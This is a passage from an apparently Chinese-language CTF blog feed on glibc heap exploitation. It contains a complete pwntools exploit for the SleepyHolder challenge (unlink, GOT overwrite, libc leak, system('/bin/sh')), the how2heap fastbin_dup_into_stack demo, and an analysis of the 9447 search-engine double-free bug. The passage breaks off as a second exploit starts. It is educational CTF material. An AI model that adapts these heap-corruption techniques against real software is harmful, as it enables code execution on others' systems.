int v6; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  alarm0x3c();                                  // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Waking Sleepy Holder up ...&quot;);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 4uLL);</span><br><span class="line">  buf &amp;= 0xFFFu;</span><br><span class="line">  malloc(buf);                                  // malloc something random to change heap_address every time</span><br><span class="line">                                                // </span><br><span class="line">  sleep(3u);</span><br><span class="line">  puts(&quot;Hey! Do you have any secret?&quot;);</span><br><span class="line">  puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;1. Keep secret&quot;);</span><br><span class="line">    puts(&quot;2. Wipe secret&quot;);</span><br><span class="line">    puts(&quot;3. Renew secret&quot;);</span><br><span class="line">    memset(&amp;s, 0, 4uLL);</span><br><span class="line">    read(0, &amp;s, 4uLL);</span><br><span class="line">    v3 = atoi(&amp;s);</span><br><span class="line">    v6 = v3;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        wipe_secret();     //仅仅把free掉并把该chunk的inuse位标记为0</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        renew_secret();    //重新改写1或者2的chunk，大小最大还是原来那么大。</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        keep_serect();    //选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1.</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>假设三个chunk分别为chunk0,1,2;</p><ol><li>首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1.</li><li>之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。</li><li>通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。</li><li>算出system的地址，并将其写入free_got，调用free便可以getshell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">p = process(&apos;./SleepyHolder&apos;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./SleepyHolder&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)     //ldd ./SleepyHolder</span><br><span class="line"></span><br><span class="line">def add(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.send(str(index))</span><br><span class="line"></span><br><span class="line">def update(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">#分配chunk1 chunk2</span><br><span class="line">add(1, &apos;a&apos;*0x10)</span><br><span class="line">add(2, &apos;b&apos;*0x10)</span><br><span class="line">#释放chunk1</span><br><span class="line">delete(1)</span><br><span class="line">#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0</span><br><span class="line">add(3, &apos;c&apos;*0x10)</span><br><span class="line">#这时再释放chunk1，让chunk1重新进入fast bin</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">heap_ptr = 0x6020d0 #堆指针</span><br><span class="line">#准备unlink，在chunk1中伪造chunk</span><br><span class="line">payload = p64(0) + p64(0x21)</span><br><span class="line">payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)</span><br><span class="line">payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_size</span><br><span class="line">add(1, payload)</span><br><span class="line">#此时chunk2的inuse位是0，所以触发unlink</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">atoi_got = elf.got[&apos;atoi&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts = elf.symbols[&apos;puts&apos;]</span><br><span class="line">system_off = libc.symbols[&apos;system&apos;]</span><br><span class="line">atoi_off = libc.symbols[&apos;atoi&apos;]</span><br><span class="line"></span><br><span class="line">#unlink后 堆指针被修改，向现在指针所指内存写入数据</span><br><span class="line">#将chunk2指针覆盖为atoi_got</span><br><span class="line">#将chunk3指针覆盖为puts_got</span><br><span class="line">#将chunk1指针覆盖为free_got</span><br><span class="line">payload = p64(0) + p64(atoi_got)</span><br><span class="line">payload += p64(puts_got) + p64(free_got)</span><br><span class="line">update(1, payload)</span><br><span class="line">#再次向chunk1写入，相当于向free_got写入</span><br><span class="line">#这里将free_got写为puts</span><br><span class="line">update(1, p64(puts))</span><br><span class="line"></span><br><span class="line">#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)</span><br><span class="line">#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址</span><br><span class="line">#由此可计算出libc_base</span><br><span class="line">delete(2)</span><br><span class="line">libc_base = u64(p.recv(6) + &apos;\x00\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节</span><br><span class="line">print &quot;libc_base : %#x&quot; % libc_base </span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line">#将free的got表写为system</span><br><span class="line">update(1, p64(system))</span><br><span class="line">#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数</span><br><span class="line">add(2, &apos;/bin/sh\x00&apos;)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;比较神奇的一个利用。&lt;br&gt;pwntools —&amp;gt;  cyclic   cyclic_find&lt;br&gt;i locals&lt;/p&gt;
&lt;h1 id=&quot;fastbin-dup-consolidate原理&quot;&gt;&lt;a href=&quot;#fastbin-dup-consolidate原理
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.1-fastbin_dup</title>
    <link href="http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/"/>
    <id>http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/</id>
    <published>2018-10-15T11:14:55.000Z</published>
    <updated>2019-02-19T06:14:51.320Z</updated>
    
    <content type="html"><![CDATA[<p><em>尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。</em></p><h1 id="fastbin-dup原理"><a href="#fastbin-dup原理" class="headerlink" title="fastbin_dup原理"></a>fastbin_dup原理</h1><p>利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。<br>产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p><p>可以用how2heap的例子来理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> ./fastbin_dup_into_stack </span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffe1abfa870.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">3rd malloc(8): 0x56317e17e2a0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x56317e17e280.</span><br><span class="line">Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">Now the free list has [ 0x56317e17e260 ].</span><br><span class="line">Now, we have access to 0x56317e17e260 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x56317e17e260, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffe1abfa860</span><br></pre></td></tr></table></figure><p>可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。</p><h1 id="例题-9447-search-engine"><a href="#例题-9447-search-engine" class="headerlink" title="例题-9447-search-engine"></a>例题-9447-search-engine</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1: Search with a word&quot;);</span><br><span class="line">  puts(&quot;2: Index a sentence&quot;);</span><br><span class="line">  return puts(&quot;3: Quit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inde a sentence.程序写的很复杂，看起来很揪心。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">int index_a_sentence()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  __int64 v1; // rbp</span><br><span class="line">  int v2; // er13</span><br><span class="line">  char *v3; // r12</span><br><span class="line">  signed __int64 v4; // rbx</span><br><span class="line">  signed __int64 v5; // rbp</span><br><span class="line">  _DWORD *v6; // rax</span><br><span class="line">  int v7; // edx</span><br><span class="line">  __int64 v8; // rdx</span><br><span class="line">  __int64 v10; // rdx</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the sentence size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  v1 = (unsigned int)(v0 - 1);</span><br><span class="line">  v2 = v0;</span><br><span class="line">  if ( (unsigned int)v1 &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the sentence:&quot;);</span><br><span class="line">  v3 = (char *)malloc(v2);</span><br><span class="line">  read_until_newline((__int64)v3, v2, 0);</span><br><span class="line">  v4 = (signed __int64)(v3 + 1);</span><br><span class="line">  v5 = (signed __int64)&amp;v3[v1 + 2];</span><br><span class="line">  v6 = malloc(0x28uLL);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)v6 = v3;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">  v6[6] = v2;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( *(_BYTE *)(v4 - 1) != 32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[2] = ++v7;</span><br><span class="line">LABEL_4:</span><br><span class="line">      if ( ++v4 == v5 )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = qword_6020B8;</span><br><span class="line">      qword_6020B8 = (__int64)v6;</span><br><span class="line">      *((_QWORD *)v6 + 4) = v10;</span><br><span class="line">      v6 = malloc(0x28uLL);</span><br><span class="line">      v7 = 0;</span><br><span class="line">      *(_QWORD *)v6 = v4;</span><br><span class="line">      v6[2] = 0;</span><br><span class="line">      *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">      v6[6] = v2;</span><br><span class="line">      goto LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)v6 = v4++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 != v5 );</span><br><span class="line">LABEL_8:</span><br><span class="line">  if ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = qword_6020B8;</span><br><span class="line">    qword_6020B8 = (__int64)v6;</span><br><span class="line">    *((_QWORD *)v6 + 4) = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    free(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Added sentence&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>search word：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">void search_with_a_word()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebp</span><br><span class="line">  void *v1; // r12</span><br><span class="line">  __int64 i; // rbx</span><br><span class="line">  char v3; // [rsp+0h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the word size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( (unsigned int)(v0 - 1) &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the word:&quot;);</span><br><span class="line">  v1 = malloc(v0);</span><br><span class="line">  read_until_newline((__int64)v1, v0, 0);</span><br><span class="line">  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( **(_BYTE **)(i + 16) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24));</span><br><span class="line">        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);</span><br><span class="line">        putchar(10);</span><br><span class="line">        puts(&quot;Delete this sentence (y/n)?&quot;);</span><br><span class="line">        read_until_newline((__int64)&amp;v3, 2, 1);</span><br><span class="line">        if ( v3 == 121 )</span><br><span class="line">        &#123;</span><br><span class="line">          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));</span><br><span class="line">          free(*(void **)(i + 16));</span><br><span class="line">          puts(&quot;Deleted!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  free(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_num：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 get_num()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  char *endptr; // [rsp+8h] [rbp-50h]</span><br><span class="line">  char nptr; // [rsp+10h] [rbp-48h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+48h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  read_until_newline((__int64)&amp;nptr, 48, 1);</span><br><span class="line">  result = strtol(&amp;nptr, &amp;endptr, 0);</span><br><span class="line">  if ( endptr == &amp;nptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1LL, &quot;%s is not a valid number\n&quot;, &amp;nptr);</span><br><span class="line">    result = get_num();</span><br><span class="line">  &#125;</span><br><span class="line">  __readfsqword(0x28u);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，<br>所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。</p><p>整个过程大概是以一个结构体来保存每个单词：(40个字节)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct words_struct </span><br><span class="line">&#123; </span><br><span class="line">  addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) </span><br><span class="line">  int64_t size; // 单词大小 </span><br><span class="line">  addr* ptr_to_sentences; //单词所在的句子字符串的位置 </span><br><span class="line">  int64_t* size_of_sentences;//句子长度 </span><br><span class="line">  words_struct* next_word;//链表下一个节点指针 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。<br>在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \x00 ，由于单词结构体中存储的单词只是句子的一个指针，<br>所以单词也会被置为 \x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。<br>看起来由于句子内容被置为 \x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，<br>当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。<br>此外，当句子被 memset 的时候，单词虽然都变为了 \x00 ，但是我们仍然可以通过两个 \x00 的比较来绕过 memcmp 的检测。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>1) 利用get_num函数的漏洞试图泄露栈地址<br>2) 泄露libc_address，从而计算出system 和 /bin/sh的地址<br>3) 利用fastbin_dup 进行double free<br>4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”)</p><p><em>思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 